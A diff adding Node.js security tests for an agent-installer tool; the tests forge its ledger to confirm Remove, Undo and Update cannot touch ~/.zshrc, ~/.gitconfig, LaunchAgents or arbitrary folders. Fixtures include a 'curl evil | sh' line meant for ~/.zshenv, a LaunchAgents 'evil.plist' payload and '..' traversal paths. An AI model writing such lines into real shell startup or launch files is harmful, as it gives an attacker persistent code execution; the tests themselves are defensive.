@@ -467,3 +467,80 @@ test('security H1: Claude Code never gets hooks, mcpServers, permissionMode or a
   }
   assert.ok(!fs.readdirSync(home).includes('.claude') || fs.readdirSync(path.join(home, '.claude/agents')).length === 0);
 });
+
+// Security review M1: a forged ledger must never reach outside the agent folders.
+function forge(s, ledger, originals = []) {
+  fs.mkdirSync(s.data, { recursive: true });
+  fs.writeFileSync(path.join(s.data, 'agent-installs.json'), JSON.stringify({ schema: 1, owned: {}, ops: [], ...ledger }));
+  if (originals.length) fs.mkdirSync(path.join(s.data, 'agent-originals'), { recursive: true });
+  for (const t of originals) fs.writeFileSync(path.join(s.data, 'agent-originals', sha(t)), t);
+}
+
+test('security M1: a forged owned entry cannot make Remove delete ~/.zshrc, directly or through ..', () => {
+  for (const rel of ['.zshrc', '.claude/agents/../../.zshrc']) {
+    const s = setup();
+    fs.mkdirSync(path.join(s.home, '.claude/agents'), { recursive: true });
+    fs.writeFileSync(path.join(s.home, '.zshrc'), 'export A=1\n');
+    forge(s, { owned: { [`claude:${rel}`]: { platform: 'claude', rel, agentId: FE.id, how: 'added', sha: sha('export A=1\n'), fileSha256: FE.fileSha256 } } });
+    const r = s.inst.remove(FE.id);
+    assert.deepEqual(r.results, [], rel);
+    assert.equal(read(s.home, '.zshrc'), 'export A=1\n', rel);
+  }
+});
+
+test('security M1: a forged update op cannot make Undo write a LaunchAgents plist', () => {
+  const s = setup();
+  const target = 'Library/LaunchAgents/evil.plist', payload = '<plist>ATTACKER</plist>\n';
+  fs.mkdirSync(path.join(s.home, 'Library/LaunchAgents'), { recursive: true });
+  fs.writeFileSync(path.join(s.home, target), 'placeholder');
+  forge(s, { owned: { [`claude:${target}`]: { platform: 'claude', rel: target, agentId: FE.id, how: 'added', sha: sha('placeholder'), fileSha256: FE.fileSha256 } },
+    ops: [{ id: 'op1', kind: 'update', changes: [{ platform: 'claude', rel: target, before: sha(payload), after: sha('placeholder') }] }] }, [payload]);
+  assert.equal(s.inst.undo('op1').ok, false);
+  assert.equal(read(s.home, target), 'placeholder');
+  // A forged remove op cannot create a new ~/.zshenv either.
+  const s2 = setup();
+  forge(s2, { ops: [{ id: 'op2', kind: 'remove', changes: [{ platform: 'claude', rel: '.zshenv', before: sha('curl evil | sh\n'), after: null }] }] }, ['curl evil | sh\n']);
+  assert.equal(s2.inst.undo('op2').ok, false);
+  assert.ok(!exists(s2.home, '.zshenv'));
+});
+
+test('security M1: a forged owned entry cannot make Update replace ~/.gitconfig', () => {
+  const s = setup();
+  fs.writeFileSync(path.join(s.home, '.gitconfig'), '[user]\n');
+  forge(s, { owned: { 'claude:.gitconfig': { platform: 'claude', rel: '.gitconfig', agentId: FE.id, how: 'added', sha: sha('[user]\n'), fileSha256: 'a'.repeat(64) } } });
+  assert.deepEqual(s.inst.update(FE.id).results, []);
+  assert.equal(read(s.home, '.gitconfig'), '[user]\n');
+  // An entry filed under another key is dropped too, rather than crashing after a write.
+  const s2 = setup();
+  s2.add(FE.id, ['claude']);
+  const l = JSON.parse(fs.readFileSync(path.join(s2.data, 'agent-installs.json'), 'utf8'));
+  l.owned = { 'claude:elsewhere': { ...Object.values(l.owned)[0], fileSha256: 'b'.repeat(64) } };
+  fs.writeFileSync(path.join(s2.data, 'agent-installs.json'), JSON.stringify(l));
+  assert.deepEqual(s2.inst.update(FE.id).results, []);
+  assert.equal(read(s2.home, '.claude/agents/frontend-developer.md'), FE.raw);
+});
+
+test('security M1: a forged add-project op cannot make Undo delete a file in any folder', () => {
+  const s = setup({ enableCursorProject: true });
+  const victim = tmp();
+  fs.writeFileSync(path.join(victim, 'important.txt'), 'keep me');
+  forge(s, { ops: [{ id: 'op4', kind: 'add-project', project: victim, changes: [{ platform: 'cursor', rel: 'important.txt', before: null, after: sha('keep me') }] }] });
+  assert.equal(s.inst.undoProject('op4').ok, false);
+  assert.equal(fs.readFileSync(path.join(victim, 'important.txt'), 'utf8'), 'keep me');
+  for (const project of [s.home, '/', 'relative/dir']) {
+    forge(s, { ops: [{ id: 'op5', kind: 'add-project', project, changes: [{ platform: 'cursor', rel: '.cursor/rules/x.mdc', before: null, after: 'c'.repeat(64) }] }] });
+    assert.equal(s.inst.undoProject('op5').ok, false, project);
+  }
+});
+
+test('security M1: locate refuses empty, . and .. components', () => {
+  const { createHomeFiles } = require('../src/home-files.js');
+  const home = tmp();
+  fs.writeFileSync(path.join(home, 'x.md'), 'x');
+  const hf = createHomeFiles({ home });
+  for (const rel of ['a/../x.md', './x.md', 'a//x.md', '..', '']) {
+    assert.throws(() => hf.locate(rel), /outside home/, rel);
+    assert.throws(() => hf.removeTarget(rel), /outside home/, rel);
+  }
+  assert.ok(fs.existsSync(path.join(home, 'x.md')));
+});
